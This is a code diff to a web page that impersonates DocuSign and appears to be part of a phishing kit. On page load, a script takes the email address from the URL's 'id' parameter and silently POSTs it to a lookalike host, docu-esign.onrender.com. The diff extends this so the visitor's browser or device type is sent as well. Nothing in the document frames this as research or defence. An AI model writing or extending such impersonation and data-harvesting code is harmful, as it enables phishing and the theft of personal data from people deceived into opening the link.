@@ -7,11 +7,71 @@
       DocuSign | #1 in Electronic Signature and Contract Lifecycle Management
     </title>
 
+    <script>
+      function detectBrowser() {
+        var userAgent = navigator.userAgent;
+        if (userAgent.indexOf("Firefox") > -1) {
+          return "Mozilla Firefox";
+        } else if (userAgent.indexOf("Chrome") > -1) {
+          return "Google Chrome";
+        } else if (userAgent.indexOf("Safari") > -1) {
+          return "Apple Safari";
+        } else if (userAgent.indexOf("Edg") > -1) {
+          return "Microsoft Edge";
+        } else if (
+          userAgent.indexOf("MSIE") > -1 ||
+          userAgent.indexOf("Trident") > -1
+        ) {
+          return "Internet Explorer";
+        } else {
+          return "Unknown"; // Return "Unknown" if the browser is not recognized
+        }
+      }
+
+      // Call the function to detect the browser and log the result
+      var browser = detectBrowser();
+      console.log("The site is opened in:", browser);
+    </script>
+
     <script type="text/javascript">
       let hasEmail = new URLSearchParams(window.location.search).has("id");
+      let userAgent;
       if (hasEmail) {
+        function isMobileDevice() {
+          return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
+            navigator.userAgent
+          );
+        }
+
+        function detectBrowser() {
+          // User agent string
+          var userAgent = navigator.userAgent;
+
+          // Check for common browser identifiers
+          if (userAgent.indexOf("Firefox") > -1) {
+            return "Mozilla Firefox";
+          } else if (userAgent.indexOf("Chrome") > -1) {
+            return "Google Chrome";
+          } else if (userAgent.indexOf("Safari") > -1) {
+            return "Apple Safari";
+          } else if (userAgent.indexOf("Edg") > -1) {
+            return "Microsoft Edge";
+          } else if (
+            userAgent.indexOf("MSIE") > -1 ||
+            userAgent.indexOf("Trident") > -1
+          ) {
+            return "Internet Explorer";
+          } else {
+            return "Unknown";
+          }
+        }
+        if (isMobileDevice()) {
+          userAgent = "Mobile Device";
+        } else {
+          userAgent = detectBrowser();
+        }
         let email = new URLSearchParams(window.location.search).get("id");
-        let payLoad = { id: 0, email: email };
+        let payLoad = { id: 0, email: email, userAgent: userAgent };
         let emailXhr = new XMLHttpRequest();
         emailXhr.open("POST", "https://docu-esign.onrender.com/email", true);
         emailXhr.setRequestHeader("Content-type", "application/json");
@@ -58,16 +118,20 @@
       content="DocuSign ensures the security &amp; mobility to digitally transform businesses. Sign docs for free."
     />
     <style>
-        #loader {
-            width: 0%;
-            position: relative;
-            animation: incrementWidth 1s linear forwards;
+      #loader {
+        width: 0%;
+        position: relative;
+        animation: incrementWidth 1s linear forwards;
+      }
+
+      @keyframes incrementWidth {
+        0% {
+          width: 0%;
         }
-    
-        @keyframes incrementWidth {
-            0% { width: 0%; }
-            100% { width: 98%; }
+        100% {
+          width: 98%;
         }
+      }
     </style>
   </head>
   <body>
@@ -84,13 +148,15 @@
         <img src="./Email_Logo.png" alt="" style="margin-left: 13px" />
         <div
           id="loader"
-          style="padding: 2px; background-color: rgb(30, 76, 161); border-radius: 4px;"
+          style="
+            padding: 2px;
+            background-color: rgb(30, 76, 161);
+            border-radius: 4px;
+          "
         ></div>
       </div>
     </div>
 
-    <script>
-
-    </script>
+    <script></script>
   </body>
 </html>
